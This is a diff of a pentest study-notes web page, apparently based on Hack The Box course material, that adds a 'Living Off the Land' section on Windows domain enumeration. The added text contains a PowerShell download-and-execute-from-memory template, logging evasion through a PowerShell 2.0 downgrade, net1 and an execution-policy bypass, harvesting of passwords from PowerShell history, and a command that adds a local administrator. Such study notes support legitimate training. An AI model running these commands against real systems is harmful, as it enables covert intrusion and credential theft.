@@ -6,7 +6,7 @@
   <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>LLMNR-NBT-NS Poisoning - from Windows &mdash; Celestial Security Reference R1 documentation</title>
+  <title>Living Off the Land &mdash; Celestial Security Reference R1 documentation</title>
       <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=8f9ffe49" />
       <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
       <link rel="stylesheet" type="text/css" href="../../_static/dark_mode_css/general.css?v=c0a7eb24" />
@@ -22,7 +22,11 @@
       <script src="../../_static/dark_mode_js/theme_switcher.js?v=358d3910"></script>
     <script src="../../_static/js/theme.js"></script>
     <link rel="index" title="Index" href="../../genindex.html" />
-    <link rel="search" title="Search" href="../../search.html" /> 
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="Changing the user-agent to avoid detection" href="../Lateral%20Movement/Changing%20the%20user-agent%20to%20avoid%20detection.html" />
+    <link rel="prev" title="Credentialed Enumeration - from Windows" href="Credentialed%20Enumeration%20-%20from%20Windows.html" />
+    <link href="../../_static/style.css" rel="stylesheet" type="text/css">
+
 </head>
 
 <body class="wy-body-for-nav"> 
@@ -77,7 +81,7 @@
 <li class="toctree-l1"><a class="reference internal" href="../Reconnaissance/Information%20Gathering.html">Information Gathering</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Initial Access</span></p>
-<ul>
+<ul class="current">
 <li class="toctree-l1"><a class="reference internal" href="File%20Inclusion.html">File Inclusion</a></li>
 <li class="toctree-l1"><a class="reference internal" href="SSH%20Forwarding.html">SSH Forwarding</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Dynamic%20Port%20Forwarding%20with%20SSH%20and%20SOCKS%20Tunneling.html">Dynamic Port Forwarding with SSH and SOCKS Tunneling</a></li>
@@ -94,12 +98,33 @@
 <li class="toctree-l1"><a class="reference internal" href="ICMP%20Tunneling%20with%20SOCKS.html">ICMP Tunneling with SOCKS</a></li>
 <li class="toctree-l1"><a class="reference internal" href="RDP%20and%20SOCKS%20Tunneling%20with%20SocksOverRDP.html">RDP and SOCKS Tunneling with SocksOverRDP</a></li>
 <li class="toctree-l1"><a class="reference internal" href="LLMNR%20NBT-NS%20Poisoning%20from%20Linux.html">LLMNR/NBT-NS Poisoning - from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="LLMNR%20NBT-NS%20Poisoning%20from%20Windows.html">LLMNR-NBT-NS Poisoning - from Windows</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Password%20Attacks.html">Password Attacks</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Remote%20Password%20Attacks.html">Remote Password Attacks</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Using%20the%20Metasploit%20Framework.html">Using the Metasploit Framework</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Shells%20and%20Payloads.html">Shells and Payloads</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Attacking%20Common%20Services.html">Attacking Common Services</a></li>
 <li class="toctree-l1"><a class="reference internal" href="Active%20Directory%20Enumeration%20Attacks.html">Active Directory Enumeration Attacks</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Password%20Spraying.html">Password Spraying</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Enumerating%20and%20Retrieving%20Password%20Policies.html">Enumerating and Retrieving Password Policies</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Internal%20Password%20Spraying%20from%20Linux.html">Internal Password Spraying from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Internal%20Password%20Spraying%20from%20Windows.html">Internal Password Spraying from Windows</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Enumerating%20Security%20Controls.html">Enumerating Security Controls</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Credentialed%20Enumeration%20-%20from%20Linux.html">Credentialed Enumeration - from Linux</a></li>
+<li class="toctree-l1"><a class="reference internal" href="Credentialed%20Enumeration%20-%20from%20Windows.html">Credentialed Enumeration - from Windows</a></li>
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Living Off the Land</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#description">Description</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#enumerating-using-env-variables">Enumerating using ENV variables</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#harnessing-powershell">Harnessing PowerShell</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#windows-management-instrumentation-wmi">Windows Management Instrumentation (WMI)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#net-commands">Net Commands</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#table-of-useful-net-commands">Table of Useful Net Commands</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="#dsquery">Dsquery</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#references">References</a></li>
+</ul>
+</li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Lateral Movement</span></p>
 <ul>
@@ -153,6 +178,7 @@
 <li class="toctree-l1"><a class="reference internal" href="../../tags/dnsenum.html">dnsenum</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/dnsrecon.html">dnsrecon</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/dnsx.html">dnsx</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/dsquery.html">dsquery</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/ettercap.html">ettercap</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/enum4linux-ng.html">enum4linux-ng</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/Evasive%20testing.html">Evasive Testing</a></li>
@@ -188,6 +214,7 @@
 <li class="toctree-l1"><a class="reference internal" href="../../tags/john.html">john</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/keytab.html">keytab</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/keytabextract.py.html">keytabextract.py</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/kerberoast.html">kerberoast</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/kwprocessor.html">kwprocessor</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/ldapsearch.html">ldapsearch</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/lazagne.html">lazagne</a></li>
@@ -248,11 +275,9 @@
 <li class="toctree-l1"><a class="reference internal" href="../../tags/recon-ng.html">recon-ng</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/reconSpider.html">reconSpider</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/responder.html">responder</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/rid.html">rid</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/rpc.html">rpc</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/rsync.html">rsync</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../tags/rsync.html#description">Description</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../tags/rsync.html#footprinting">Footprinting</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../../tags/rsync.html#references">References</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/rpcclient.html">rpcclient</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/rpcinfo.html">rpcinfo</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/rcpdump.py.html">rcpdump.py</a></li>
@@ -270,6 +295,7 @@
 <li class="toctree-l1"><a class="reference internal" href="../../tags/secretsdump.py.html">secretsdump.py</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/setspn.exe.html">setspn.exe</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/shells.html">shells</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tags/sid.html">sid</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/smbmap.html">smbmap</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/SMTP.html">SMTP</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../../tags/smtp-user-enum.html">smtp-user-enum</a></li>
@@ -343,9 +369,9 @@
           <div role="navigation" aria-label="Page navigation">
   <ul class="wy-breadcrumbs">
       <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
-      <li class="breadcrumb-item active">LLMNR-NBT-NS Poisoning - from Windows</li>
+      <li class="breadcrumb-item active">Living Off the Land</li>
       <li class="wy-breadcrumbs-aside">
-            <a href="../../_sources/CPTS/Initial Access/LLMNR-NBT-NS Poisoning - from Windows.rst.txt" rel="nofollow"> View page source</a>
+            <a href="../../_sources/CPTS/Initial Access/Living Off the Land.rst.txt" rel="nofollow"> View page source</a>
       </li>
   </ul>
   <hr/>
@@ -353,14 +379,207 @@
           <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div itemprop="articleBody">
              
-  <section id="llmnr-nbt-ns-poisoning-from-windows">
-<h1>LLMNR-NBT-NS Poisoning - from Windows<a class="headerlink" href="#llmnr-nbt-ns-poisoning-from-windows" title="Link to this heading"></a></h1>
+  <section id="living-off-the-land">
+<h1>Living Off the Land<a class="headerlink" href="#living-off-the-land" title="Link to this heading"></a></h1>
+<p>Date: 2024-12-25 12:34:44</p>
+<p>Status: #new</p>
+<p>Tags: <a class="reference internal" href="Active%20Directory%20Enumeration%20Attacks.html#active-directory-enumeration-attacks"><span class="std std-ref">Active Directory Enumeration Attacks</span></a></p>
+<section id="description">
+<h2>Description<a class="headerlink" href="#description" title="Link to this heading"></a></h2>
+<p>In scenarios where a more stealthy approach to pentesting is required, or you are unable to load and/or use any third
+party tools, you may have to take avantage to utilities that are common to the operating system.</p>
+<p>This approach makes less noise on the network, and is less likely to be identified and blocked using these techniques.</p>
+</section>
+<section id="enumerating-using-env-variables">
+<h2>Enumerating using ENV variables<a class="headerlink" href="#enumerating-using-env-variables" title="Link to this heading"></a></h2>
+<p><cite>hostname</cite>                                  Displays the host name
+<cite>[System.Environment]::OSVersion.Version</cite>       Prints out the OS version and revision level
+<cite>wmic qfe get Caption,Description,
+HotFixID,InstalledOn</cite>                       Prints the patches and hotfixes applied to the host
+<cite>ipconfig /all</cite>                             Prints out network adapter state and configurations
+<cite>echo %USERDOMAIN%</cite>                         Displays the domain name to which the host belongs (run from CMD-prompt)
+<cite>echo %logonserver%</cite>                        Prints out the name of the Domain controller the host checks in with (run from CMD-prompt)</p>
+</section>
+<section id="harnessing-powershell">
+<h2>Harnessing PowerShell<a class="headerlink" href="#harnessing-powershell" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Lists available modules loaded for use.</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-Module</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Will print the execution policy settings for each scope on a host.</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-ExecutionPolicy</span> <span class="n">-List</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won’t be making a permanent change to the victim host.</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Set-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-Scope</span> <span class="k">Process</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Return environment values such as key paths, users, computer information, etc.</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-ChildItem</span> <span class="n">Env</span><span class="p">:</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">Key</span><span class="p">,</span><span class="n">Value</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>With this string, we can get the specified user’s PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Get-Content</span> <span class="nv">$env:APPDATA</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Powershell</span><span class="p">\</span><span class="n">PSReadline</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="n">txt</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>This is a quick and easy way to download a file from the web using PowerShell and call it from memory.</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>   <span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&quot;iex(New-Object Net.WebClient).DownloadString(&#39;URL to download the file from&#39;); &lt;follow-on commands&gt;&quot;</span>
+
+<span class="p">-</span> <span class="n">Attempt</span> <span class="n">to</span> <span class="n">call</span> <span class="n">Powershell</span> <span class="n">version</span> <span class="n">2</span><span class="p">.</span><span class="n">0</span> <span class="n">or</span> <span class="n">older</span><span class="p">.</span>  <span class="n">Version</span> <span class="n">3</span><span class="p">.</span><span class="n">0</span> <span class="n">has</span> <span class="n">logging</span><span class="p">,</span> <span class="n">2</span><span class="p">.</span><span class="n">0</span> <span class="n">does</span> <span class="n">not</span> <span class="p">-</span> <span class="k">for</span> <span class="n">stealthy</span> <span class="n">operations</span>
+</pre></div>
+</div>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-version</span> <span class="n">2</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Checking to see the status of the Firewall</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">show</span> <span class="n">allprofiles</span>
+</pre></div>
+</div>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C:\htb&gt; sc query windefend</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Geting the configuration settings for Defender</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Get-MpComputerStatus</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>Checking to see who else may be logged in</p></li>
+</ul>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="n">qwinsta</span>
+</pre></div>
+</div>
+</section>
+<section id="windows-management-instrumentation-wmi">
+<h2>Windows Management Instrumentation (WMI)<a class="headerlink" href="#windows-management-instrumentation-wmi" title="Link to this heading"></a></h2>
+<p>A scripting engine for system management purposes.  utilizing this will alow you to enumerate details of the confiruration</p>
+<p>See below for examples</p>
+<ul class="simple">
+<li><p><a class="reference internal" href="../../tags/WMI.html#wmi"><span class="std std-ref">WMI</span></a></p></li>
+</ul>
+</section>
+<section id="net-commands">
+<h2>Net Commands<a class="headerlink" href="#net-commands" title="Link to this heading"></a></h2>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Net commands create logs, and are often monitored by EDR solutions. In a stealthy engagement these commands can give away your location.
+There is a work around, where you can try net1 instead of net - it may not log.</p>
+</div>
+<section id="table-of-useful-net-commands">
+<h3>Table of Useful Net Commands<a class="headerlink" href="#table-of-useful-net-commands" title="Link to this heading"></a></h3>
+<table class="docutils align-default" id="id1">
+<caption><span class="caption-text">Net Commands</span><a class="headerlink" href="#id1" title="Link to this table"></a></caption>
+<colgroup>
+<col style="width: 50.0%" />
+<col style="width: 50.0%" />
+</colgroup>
+<thead>
+<tr class="row-odd"><th class="head"><p>Command</p></th>
+<th class="head"><p>Description</p></th>
+</tr>
+</thead>
+<tbody>
+<tr class="row-even"><td><p><cite>net accounts</cite></p></td>
+<td><p>Information about password requirements</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net accounts /domain</cite></p></td>
+<td><p>Password and lockout policy</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net group /domain</cite></p></td>
+<td><p>Information about domain groups</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net group “Domain Admins” /domain</cite></p></td>
+<td><p>List users with domain admin privileges</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net group “domain computers” /domain</cite></p></td>
+<td><p>List of PCs connected to the domain</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net group “Domain Controllers” /domain</cite></p></td>
+<td><p>List PC accounts of domains controllers</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net group &lt;domain_group_name&gt; /domain</cite></p></td>
+<td><p>User that belongs to the group</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net groups /domain</cite></p></td>
+<td><p>List of domain groups</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net localgroup</cite></p></td>
+<td><p>All available groups</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net localgroup administrators /domain</cite></p></td>
+<td><p>List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net localgroup Administrators</cite></p></td>
+<td><p>Information about a group (admins)</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net localgroup administrators [username] /add</cite></p></td>
+<td><p>Add user to administrators</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net share</cite></p></td>
+<td><p>Check current shares</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net user &lt;ACCOUNT_NAME&gt; /domain</cite></p></td>
+<td><p>Get information about a user within the domain</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net user /domain</cite></p></td>
+<td><p>List all users of the domain</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net user %username%</cite></p></td>
+<td><p>Information about the current user</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net use x: computershare</cite></p></td>
+<td><p>Mount the share locally</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net view</cite></p></td>
+<td><p>Get a list of computers</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net view /all /domain[:domainname]</cite></p></td>
+<td><p>Shares on the domains</p></td>
+</tr>
+<tr class="row-odd"><td><p><cite>net view computer /ALL</cite></p></td>
+<td><p>List shares of a computer</p></td>
+</tr>
+<tr class="row-even"><td><p><cite>net view /domain</cite></p></td>
+<td><p>List of PCs of the domain</p></td>
+</tr>
+</tbody>
+</table>
+</section>
+</section>
+<section id="dsquery">
+<h2>Dsquery<a class="headerlink" href="#dsquery" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p><a class="reference internal" href="#dsquery"><span class="std std-ref">Dsquery</span></a></p></li>
+</ul>
+</section>
+<section id="references">
+<h2>References<a class="headerlink" href="#references" title="Link to this heading"></a></h2>
+<p><a class="reference external" href="https://academy.hackthebox.com/module/143/section/1360">https://academy.hackthebox.com/module/143/section/1360</a></p>
+</section>
 </section>
 
 
            </div>
           </div>
-          <footer>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="Credentialed%20Enumeration%20-%20from%20Windows.html" class="btn btn-neutral float-left" title="Credentialed Enumeration - from Windows" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="../Lateral%20Movement/Changing%20the%20user-agent%20to%20avoid%20detection.html" class="btn btn-neutral float-right" title="Changing the user-agent to avoid detection" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
 
   <hr/>
 
